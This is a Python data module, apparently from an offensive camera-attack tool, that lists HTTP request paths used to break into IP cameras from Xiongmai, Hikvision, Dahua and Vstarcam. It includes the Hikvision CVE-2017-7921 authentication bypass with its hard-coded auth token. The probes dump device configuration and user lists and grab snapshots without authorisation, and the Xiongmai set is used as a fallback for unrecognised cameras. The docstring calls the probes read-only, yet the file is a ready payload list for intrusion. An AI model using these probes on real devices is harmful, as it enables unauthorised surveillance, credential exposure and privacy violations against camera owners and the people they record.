# -*- coding: utf-8 -*-
"""Read-only known-vulnerability probes for IP cameras.

Data only: the engine (attack/camera.py) executes each probe as a bounded HTTP
request and interprets `kind`/`match`. Explicitly excludes RCE/command-injection
and anything that writes to the device — access/bypass/disclosure only.
"""
import config  # noqa: F401  (paths kept here for engine symmetry)

# platform -> list of probes. Each probe:
#   name    human label
#   cve     identifier (informational)
#   method  HTTP method
#   path    request path/query
#   match   how to confirm success: None (any 200), "jpeg" (JPEG magic bytes),
#           or a literal substring/regex matched against the body
#   kind    what the probe yields: "config" | "users" | "snapshot" | "stream"
VULN_PROBES = {
    "xiongmai": [
        {"name": "config dump", "cve": "xme-config",
         "method": "GET", "path": "/config.json", "match": None, "kind": "config"},
        {"name": "device info", "cve": "xme-info",
         "method": "GET", "path": "/GetServerParam", "match": None, "kind": "config"},
        {"name": "snapshot", "cve": "xme-snapshot",
         "method": "GET", "path": "/snapshot.jpg", "match": "jpeg", "kind": "snapshot"},
    ],
    "hikvision": [
        {"name": "config file", "cve": "CVE-2017-7921",
         "method": "GET",
         "path": "/System/configurationFile?auth=YWRtaW46MTEK",
         "match": None, "kind": "config"},
        {"name": "user list", "cve": "CVE-2017-7921",
         "method": "GET", "path": "/Security/users?auth=YWRtaW46MTEK",
         "match": "<user", "kind": "users"},
        {"name": "snapshot", "cve": "generic",
         "method": "GET",
         "path": "/onvif-http/snapshot?auth=YWRtaW46MTEK",
         "match": "jpeg", "kind": "snapshot"},
    ],
    "dahua": [
        {"name": "snapshot", "cve": "generic",
         "method": "GET", "path": "/cgi-bin/snapshot.cgi",
         "match": "jpeg", "kind": "snapshot"},
        {"name": "config", "cve": "dahua-rpc",
         "method": "GET", "path": "/RPC2", "match": None, "kind": "config"},
    ],
    "vstarcam": [
        {"name": "status", "cve": "generic",
         "method": "GET", "path": "/get_status.cgi", "match": None, "kind": "config"},
        {"name": "snapshot", "cve": "generic",
         "method": "GET", "path": "/snapshot.jpg", "match": "jpeg", "kind": "snapshot"},
    ],
}


def probes_for(platform):
    """Return the probe list for a fingerprint platform; the dominant Xiongmai
    set doubles as the generic fallback for unrecognized cameras."""
    return VULN_PROBES.get(platform) or VULN_PROBES["xiongmai"]
